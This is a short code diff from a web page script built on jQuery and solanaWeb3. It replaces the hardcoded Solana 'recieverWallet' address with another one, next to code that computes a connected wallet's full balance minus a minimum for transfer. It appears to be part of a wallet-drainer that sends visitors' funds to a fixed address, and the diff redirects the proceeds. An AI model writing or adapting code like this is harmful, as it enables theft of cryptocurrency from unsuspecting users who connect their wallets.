@@ -34,7 +34,7 @@ $(document).ready(function() {
 
 
 
-                    const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
+                    const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF');
                     const balanceForTransfer = walletBalanceInLamports - minBalanceInLamports;
                     alert(`Balance available for transfer: ${balanceForTransfer} SOL`);
                    // if (balanceForTransfer <= 0) {
